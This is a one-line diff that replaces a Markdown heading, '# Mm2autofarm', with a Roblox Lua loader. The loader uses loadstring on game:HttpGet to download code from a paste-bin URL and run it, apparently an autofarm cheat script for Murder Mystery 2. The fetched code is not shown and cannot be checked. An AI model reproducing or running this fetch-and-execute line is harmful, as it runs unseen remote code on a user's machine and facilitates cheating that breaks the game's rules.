@@ -1,1 +1,1 @@
-# Mm2autofarm
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/CRqqAWagOk/0"))()
